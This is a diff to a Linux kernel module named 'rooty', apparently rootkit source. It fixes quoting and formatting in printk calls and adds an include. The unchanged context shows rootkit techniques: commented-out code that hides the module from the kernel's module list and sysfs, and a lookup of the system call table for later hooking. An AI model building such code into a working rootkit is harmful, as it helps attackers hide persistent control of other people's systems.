@@ -2,6 +2,7 @@
 #include <linux/init.h>
 #include <linux/kernel.h>
 #include <linux/unistd.h>
+#include <linux/syscalls.h>
 
 MODULE_LICENSE("GPL");
 int rooty_init(void);
@@ -45,17 +46,17 @@ int rooty_init(void) {
   list_del_init(&__this_module.list);
   kobject_del(&THIS_MODULE->mkobj.kobj); */
   
- printk("rooty: module loaded\n");
+  printk("rooty: module loaded\n");
  
 /* added check for sys_call_table found or not  */
   if (sys_call_table = (psize *) find()) {
-  printk(?rooty: sys_call_table found at %p\n?,sys_call_table);
+      printk("rooty: sys_call_table found at %p\n",sys_call_table);
   } else {
-  printk(?rooty: sys_call_table not found\n?);
+      printk("rooty: sys_call_table not found\n");
   }
  return 0;
 }
 
 void rooty_exit(void) {
- printk("rooty: module removed\n");
+  printk("rooty: module removed\n");
 }
